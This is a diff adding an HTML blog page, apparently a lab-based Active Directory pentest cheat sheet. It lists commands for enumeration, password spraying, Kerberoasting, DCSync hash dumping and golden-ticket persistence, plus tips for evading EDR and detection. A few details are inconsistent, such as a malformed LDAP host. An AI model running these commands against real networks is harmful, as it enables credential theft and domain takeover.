@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <meta name="description" content="Active Directory Attack Methodology - A Comprehensive Guide" />
+    <link rel="shortcut icon" href="../img/favicon.png" type="image/x-icon" />
+    <link rel="stylesheet" href="main.css" />
+    <link rel="alternate" type="application/atom+xml" title="feed" href='../atom.html'>
+    <title>Active Directory Attack Methodology</title>
+</head>
+
+<body>
+    <div class="dark-mode-container">
+        <input id="darkSwitch" type="checkbox" />
+        <label class="dark-mode-btn" for="darkSwitch"><img src="../img/lisp-logo.png" width=35px/></label>
+    </div>
+    <main class="main-content max-width-3 mx-auto">
+        <div>
+            <h1>
+                <a href="../index.html"> ../ </a> ad-methodology
+            </h1>
+            <div class="line" aria-hidden="true"></div>
+            <div class="page-content">
+                <p>A comprehensive methodology for Active Directory penetration testing and attack simulations.</p>
+
+                <center style="margin:20px; margin-top:30px; margin-bottom:30px;">
+                    <b>Knowledge without documentation is knowledge lost.</b>
+                </center>
+
+                <h2>1. Initial Domain Reconnaissance</h2>
+                
+                <h3>Network Scanning</h3>
+                <pre><code># Basic network sweep
+nmap -sn 192.168.129.0/24
+nbtscan -r 192.168.129.0/24
+
+# Detailed scan of identified hosts
+nmap -A -p- 192.168.129.128
+nmap -sV -sC -p389,636,3268,3269 192.168.129.128
+
+# SMB Version Detection
+nmap --script smb-protocols 192.168.129.128</code></pre>
+
+                <h3>Initial Domain Information</h3>
+                <pre><code># Null session check
+nxc smb 192.168.129.128 -u '' -p ''
+
+# LDAP anonymous bind
+ldapsearch -x -H ldap://192.168.129.128 -s base namingcontexts
+ldapsearch -x -H ldap://8 -s sub -b "DC=MARVEL,DC=local"
+
+# RPC enumeration
+rpcclient -U "" -N 10.0.0.25
+    enumdomusers
+    enumdomgroups
+    queryuser 0x457</code></pre>
+
+                <h3>BloodHound Collection and Analysis</h3>
+                <pre><code># Install and run collector
+sudo bloodhound-python -d MARVEL.local -ns 192.168.129.128 -u 'fcastle' -p 'Password1' -c All
+neo4j start
+bloodhound</code></pre>
+
+                <h4>Key BloodHound Queries</h4>
+                <pre><code>// Find all Domain Admins
+MATCH p=(n:Group {name:'DOMAIN ADMINS@MARVEL.LOCAL'})<-[:MemberOf*1..]-(m) RETURN p
+
+// Find Kerberoastable Users
+MATCH (u:User {hasspn:true}) RETURN u.name, u.displayname
+
+// Find machines where Domain Admins log in
+MATCH p=(c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@MARVEL.LOCAL'}) RETURN p</code></pre>
+
+                <h2>2. User Enumeration and Discovery</h2>
+                
+                <h3>Kerbrute Enumeration</h3>
+                <pre><code># Username enumeration
+kerbrute userenum -d AFC-RICHMOND.local --dc 10.0.0.25 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+
+# Password spraying (after finding users)
+kerbrute passwordspray -d MARVEL.local --dc 192.168.129.128 valid_users.txt Password1</code></pre>
+
+                <h2>3. Password Attacks</h2>
+                
+                <h3>Kerberos Attacks</h3>
+                <pre><code># AS-REP Roasting
+impacket-GetNPUsers MARVEL.local/ -usersfile valid_users.txt -dc-ip 192.168.129.128 -format hashcat
+
+# Kerberoasting
+impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 192.168.129.128 -request</code></pre>
+
+                <h2>4. Post-Compromise Enumeration</h2>
+                
+                <h3>Share Enumeration</h3>
+                <pre><code># Enumerate shares with found credentials
+nxc smb 192.168.129.128 -u fcastle -p 'Password1' --shares
+smbmap -u fcastle -p Password1 -d MARVEL.local -H 192.168.129.128 -R 'Department Shares'</code></pre>
+
+                <h2>5. Privilege Escalation</h2>
+                
+                <h3>Token Impersonation</h3>
+                <pre><code># Using Invoke-TokenManipulation
+Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"</code></pre>
+
+                <h2>6. Domain Admin Access</h2>
+                
+                <h3>DCSync Attack</h3>
+                <pre><code># Extract NTDS.dit hashes
+impacket-secretsdump MARVEL.local/administrator:'P@$$w0rd!'@192.168.129.128 -just-dc-ntlm</code></pre>
+
+                <h2>7. Persistence</h2>
+                
+                <h3>Golden Ticket</h3>
+                <pre><code># Create golden ticket
+impacket-ticketer -nthash &lt;krbtgt_hash&gt; -domain-sid S-1-5-21-... -domain MARVEL.local Administrator</code></pre>
+
+                <h2>8. Important Notes</h2>
+                
+                <h3>Operational Security</h3>
+                <ul>
+                    <li>Always check for EDR/AV before running tools</li>
+                    <li>Use living-off-the-land binaries where possible</li>
+                    <li>Consider OPSEC when choosing attack paths</li>
+                    <li>Monitor for failed login attempts</li>
+                    <li>Use native tools when possible to avoid detection</li>
+                </ul>
+
+                <h3>Tool Selection Guidelines</h3>
+                <ul>
+                    <li>PSExec: Full shell, creates service</li>
+                    <li>WMI: Stealthier, semi-interactive</li>
+                    <li>PowerShell Remoting: Native, but logged</li>
+                    <li>RDP: GUI access, but noisy</li>
+                    <li>Pass-The-Hash: No plaintext needed</li>
+                </ul>
+
+                <hr/>
+
+                <p><strong>Note:</strong> This methodology is for educational purposes and authorized penetration testing only. Always ensure you have proper authorization before testing any systems.</p>
+            </div>
+        </div>
+    </main>
+
+    <script src="../js/dark-mode-switch.min.js"></script>
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+    <script type="text/javascript" src="../js/MathJaxdda6.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script defer data-domain="blog.leonardotamiano.xyz" src="../../analytics.esadecimale.it/js/script.js"></script>
+</body>
+</html>
